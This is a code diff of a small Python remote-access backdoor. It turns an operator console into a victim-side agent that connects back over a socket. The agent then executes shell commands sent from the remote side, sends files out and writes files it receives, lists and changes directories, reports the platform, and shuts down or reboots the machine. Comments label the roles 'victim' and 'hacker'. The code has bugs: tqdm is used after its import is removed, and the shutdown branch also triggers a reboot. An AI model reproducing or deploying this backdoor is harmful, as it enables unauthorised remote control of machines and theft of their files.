@@ -1,18 +1,9 @@
 import socket
-import sys 
-import os 
+import subprocess
+from platform import system
+import os
+import sys
 from colorama import *
-from tqdm import tqdm
-
-# check if the history file exist
-# if true skip it
-# if false make it
-for file in os.listdir():
-    if file == '.history':
-        history_file = open('.history', 'w+')
-        break
-    else:
-        history_file = open('.history', 'w+')
 
 # colors
 BLUE = Fore.LIGHTBLUE_EX
@@ -26,8 +17,9 @@ RESET = Style.RESET_ALL
 HOST_NAME = socket.gethostname()
 HOST = socket.gethostbyname(HOST_NAME)
 PORT = 5050
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+# client socket
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 while True:
     try:
@@ -38,57 +30,35 @@ while True:
         print("CONNECTION !")
         break
 
+files = []
+
 while True:
-    command = str(input("[+] Admin~$ "))
-    if command != '' and not command.isspace():
-        history_file.write(f"{command}\n")
+    path = os.getcwd().split(os.sep)
+    command = client.recv(1024).decode()
     
-    # clear screen
-    if command == 'clear':
-        os.system('clear')
+    if command == 'ls':
+        
+        for obj in os.listdir(os.sep.join(path)):
+            if os.path.isfile(obj):
+                files.append(f'{WHITE}{obj}{RESET}')
+            elif os.path.isdir(obj):
+                files.append(f'{BLUE}{obj}{RESET}')
 
-    # clear history file
-    elif command == 'clear history':
-        history_file.truncate(0)
+        files = ' '.join(files)
 
-    # print history file
-    elif command == 'history':
-        history_file.seek(0)
-        for index, line in enumerate(history_file.readlines()):
-            print(f"{index} {line.strip()}")
+        client.send(files.encode())
+        
+        files = []
+    
+    # execute commands remotly
+    elif command == 'shell':
+        output = subprocess.run(client.recv(1024).decode(), shell=True, capture_output=True, text=True)
+        client.send(str(output.stdout).encode())
 
-    # send file 
+	# send file
     elif command.startswith('send '):
         filename = command[5:]
-        try:
-            total_size = os.path.getsize(filename)
-            client.send(command.encode())
-            client.send(f"{total_size:<16}".encode())  # send filesize first
-        
-            with open(filename, 'rb') as f, tqdm(total=total_size, unit='B', unit_scale=True, desc=filename) as progress:
-                while (chunk := f.read(1024)):
-                    client.send(chunk)
-                    progress.update(len(chunk))
-            print(f"{GREEN}[+] File '{filename}' sent successfully{RESET}")
-        except FileNotFoundError:
-            print(f"{RED}[!] File not found: {filename}{RESET}")
-
-    # execute command remotly
-    elif command == 'shell':
-        client.send(command.encode())
-        client.send(str(input("[+] Enter command\n~$ ")).encode())
-        print(client.recv(1024).decode())
-
-    # get file_name 
-    elif command.startswith('get '):
-        filename = command[4:]
-        client.send(command.encode())
-    
-        # Receive filesize from server (16 bytes)
         total_size = int(client.recv(16).decode())
-        if total_size == 0:
-            print(f"{RED}[!] File not found on server{RESET}")
-            continue
     
         with open(filename, 'wb') as f, tqdm(total=total_size, unit='B', unit_scale=True, desc=filename) as progress:
             received = 0
@@ -99,66 +69,46 @@ while True:
                 f.write(data)
                 received += len(data)
                 progress.update(len(data))
-        print(f"{GREEN}[+] File '{filename}' downloaded successfully{RESET}")
+        print(f"{GREEN}[+] File '{filename}' received successfully{RESET}")
 
-    # get directory list content
-    elif command == 'ls':
-        client.send(command.encode())
-        print(client.recv(1024).decode())
-
+    # get file
+    elif command.startswith('get '):
+        filename = command[4:]
+        try:
+            total_size = os.path.getsize(filename)
+            client.send(f"{total_size:<16}".encode())  # send filesize padded to 16 bytes
+            with open(filename, 'rb') as f:
+                while (chunk := f.read(1024)):
+                    client.send(chunk)
+        except FileNotFoundError:
+            client.send(b'0'.ljust(16))  # send zero filesize to signal error
+    
     # get current work directory (getcwd)
     elif command == 'pwd':
-        client.send(command.encode())
-        print(client.recv(1024).decode())
-
-    # shutdown the computer
+        client.send(os.sep.join(path).encode())
+    # shutdown the pc
     elif command == 'shutdown':
-        client.send(command.encode())
-
-    # reboot the computer
-    elif command == 'reboot':
-        client.send(command.encode())
+        os.system('shutdown now') # for windows [ shutdown \s \t 0 ]
+    # reboot the pc
+        os.system('reboot')   # for windows [ shutdown \r \t 0 ]
     
-    # get the hacker host
-    elif command == 'host':
-        print(f"Host : {HOST}")
-    
-    # get the hacker host-name
-    elif command == 'host-name':
-        print(f"HostName : {HOST_NAME}")
-    
-    # get the victim host
+    # get victim host
     elif command == 'vhost':
-        client.send(command.encode())
-        print(f"VHost : {client.recv(1024).decode()}")
-    
-    # get the victim host-name
+        client.send(str(HOST).encode())
+
+    # get victim host-name
     elif command == 'vhost-name':
-        client.send(command.encode())
-        print(f"VHostName : {client.recv(1024).decode()}")
+        client.send(str(HOST_NAME).encode())
 
     # change directory
     elif command.startswith('cd '):
-        client.send(command.encode())
+        os.chdir(os.sep.join(command.split()[1:]))
     
-    # get platform type
     elif command == 'platform':
-        client.send(command.encode())
-        print(client.recv(1024).decode())
-
+        client.send(f'{YELLOW}Platform : {system()}{RESET}'.encode())
     # exit remote
     elif command == 'exit':
-        history_file.close()
-        print("0:KILL TERMINAL")
-        client.send('exit'.encode())
         break
-
-    # is space
-    elif command.isspace() or command == '':
-        pass
-
-    # Unkown command
-    else:
-        print(f'{RED}[!] unkown command{RESET}')
-
+    
+client.close()
 sys.exit()
